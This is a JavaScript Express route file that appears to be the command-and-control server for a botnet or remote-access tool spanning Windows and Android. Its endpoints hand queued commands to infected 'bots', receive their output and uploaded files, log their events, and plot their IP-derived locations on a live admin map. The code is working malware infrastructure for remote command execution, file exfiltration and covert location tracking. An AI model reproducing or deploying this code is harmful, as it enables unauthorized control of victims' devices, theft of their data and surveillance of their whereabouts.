"use strict";

const path    = require("path");
const express = require("express");
const multer  = require("multer");

const { UPLOADS_DIR, MAX_EVENTS } = require("../config/constants");
const { botAuthed }               = require("../middleware/auth");
const { getOrCreate, recordNetlog } = require("../controllers/botController");
const { runDetection }            = require("../controllers/detectionEngine");
const { computeRiskScore }        = require("../controllers/detectionEngine");
const { bots: _bots }             = require("../state");
const persist                     = require("../persist");
const { geoIp }                   = require("../utils/geoip");
const { requireAdmin }            = require("../middleware/auth");

const router = express.Router();

const storage = multer.diskStorage({
  destination: (_req, _file, cb) => cb(null, UPLOADS_DIR),
  filename: (req, file, cb) => {
    const id  = req.query.id || "unknown";
    const ext = path.extname(file.originalname) || ".bin";
    cb(null, `${id}_${Date.now()}${ext}`);
  },
});
const upload = multer({ storage, limits: { fileSize: 20 * 1024 * 1024 } });

router.get("/ping", (req, res) => {
  if (!botAuthed(req)) return res.status(403).send("Unauthorized");
  res.send("OK");
});

router.get("/checkin", (req, res) => {
  if (!botAuthed(req)) return res.status(403).send("");
  const id = req.query.id, info = req.query.info || "";
  if (!id) return res.status(400).send("");
  // Silently ignore blocked bots — don't update state, don't log
  if (_bots[id]?.blocked) return res.status(200).send("");
  const bot    = getOrCreate(id);
  bot.info     = info;
  bot.lastSeen = new Date().toISOString();
  recordNetlog(bot, req, res, 0);

  // IP geolocation for Windows bots (fire-and-forget, city-level only)
  if (!bot.lastLoc) {
      const clientIp = req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "";
      geoIp(clientIp).then(geo => {
          if (geo && bot) {
              bot.lastLoc = { time: new Date().toISOString(), lat: geo.lat, lon: geo.lon, acc: null, city: geo.city, country: geo.country, isp: geo.isp, source: "ip" };
              persist.scheduleSave();
          }
      }).catch(() => {});
  }

  console.log(`[+] Checkin  bot=${id}`);
  res.status(200).send("");
});

router.get("/cmd", (req, res) => {
  if (!botAuthed(req)) return res.status(403).send("");
  const id = req.query.id;
  if (!id) return res.status(400).send("");
  const bot = _bots[id];
  if (!bot || bot.blocked) return res.status(200).send("");
  bot.lastSeen   = new Date().toISOString();
  const cmd      = bot.pendingCmd || "";
  bot.pendingCmd = "";
  if (cmd) persist.scheduleSave();
  recordNetlog(bot, req, res, cmd.length);
  res.status(200).send(cmd);
});

router.get("/result", (req, res) => {
  if (!botAuthed(req)) return res.status(403).send("");
  const id = req.query.id, data = req.query.data || "";
  if (!id) return res.status(400).send("");
  if (_bots[id]?.blocked) return res.status(200).send("");
  const bot = getOrCreate(id);
  bot.lastSeen = new Date().toISOString();
  bot.results.push({ time: new Date().toISOString(), data });
  persist.scheduleSave();
  recordNetlog(bot, req, res, data.length);
  console.log(`[result]  bot=${id}  ${data.substring(0, 80).replace(/%0A/g, " ")}`);
  res.status(200).send("");
});

router.post("/upload", upload.single("file"), (req, res) => {
  if (!botAuthed(req)) return res.status(403).send("");
  const id = req.query.id;
  if (!id || !req.file) return res.status(400).send("bad request");
  if (_bots[id]?.blocked) return res.status(200).send("");
  const bot = getOrCreate(id);
  bot.lastSeen = new Date().toISOString();
  bot.files.push(req.file.filename);
  persist.scheduleSave();
  recordNetlog(bot, req, res, req.file?.size || 0);
  console.log(`[upload]  bot=${id}  ${req.file.filename}`);
  res.status(200).send(req.file.filename);
});

router.post("/event", express.json({ limit: "64kb" }), (req, res) => {
  if (!botAuthed(req)) return res.status(403).send("");
  const id = req.query.id;
  if (!id) return res.status(400).send("");
  if (_bots[id]?.blocked) return res.status(200).send("");

  const evt = req.body;
  if (!evt || typeof evt !== "object") return res.status(400).send("");

  const bot = getOrCreate(id);
  bot.lastSeen = new Date().toISOString();
  evt.received = new Date().toISOString();

  bot.events.push(evt);
  if (bot.events.length > MAX_EVENTS) bot.events.splice(0, bot.events.length - MAX_EVENTS);

  const sev = (evt.sev || "info").toUpperCase();
  if (sev === "HIGH" || sev === "CRITICAL")
    console.log(`[EVENT:${sev}]  bot=${id}  ${evt.ev || evt.type}`);

  runDetection(bot, evt);
  computeRiskScore(bot);
  persist.scheduleSave();
  recordNetlog(bot, req, res, JSON.stringify(evt).length);

  res.status(200).send("");
});

// ── Combined live location map — all bots (Windows + Android) ─────────────────
router.get("/api/location/all", requireAdmin, (_req, res) => {
    const points = Object.values(_bots)
        .filter(b => b.lastLoc && !b.blocked)
        .map(b => {
            const isAndroid = b.info && b.info.includes("platform=android");
            return {
                id:       b.id,
                platform: isAndroid ? "android" : "windows",
                lat:      b.lastLoc.lat,
                lon:      b.lastLoc.lon,
                acc:      b.lastLoc.acc,
                city:     b.lastLoc.city    || null,
                country:  b.lastLoc.country || null,
                isp:      b.lastLoc.isp     || null,
                source:   b.lastLoc.source  || "gps",
                time:     b.lastLoc.time,
                lastSeen: b.lastSeen,
                label:    isAndroid
                    ? (b.info.match(/mfr=([^|]+)/)?.[1] || "") + " " + (b.info.match(/model=([^|]+)/)?.[1] || "")
                    : (b.info ? b.info.slice(0, 40) : b.id.slice(0, 16)),
            };
        });
    res.json(points);
});

module.exports = router;
